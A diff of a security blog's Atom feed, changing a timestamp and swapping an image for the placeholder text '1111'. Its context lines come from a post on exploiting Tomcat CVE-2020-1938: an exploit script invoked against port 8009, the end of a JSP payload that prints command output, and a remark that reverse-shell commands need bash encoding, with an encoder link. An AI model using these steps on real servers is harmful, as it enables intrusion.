@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2020-02-21T09:34:26.310Z</updated>
+    <updated>2020-02-21T09:44:47.304Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com/atom.xml"/>
@@ -51,7 +51,7 @@
 </ul>
 <pre><code>python2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 127.0.0.1
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1582272211312.png" alt="" loading="lazy"></figure>
+<p>1111</p>
 <ul>
 <li>test.txt</li>
 </ul>
@@ -81,7 +81,7 @@
 	out.print(&quot;&lt;/pre&gt;&quot;);
 %&gt;
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1582276683356.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1582276683356.png" alt="" loading="lazy"></figure>
 <ul>
 <li>反弹shell用的命令需要进行bash编码</li>
 <li>在线bash编码：http://www.jackson-t.ca/runtime-exec-payloads.html</li>
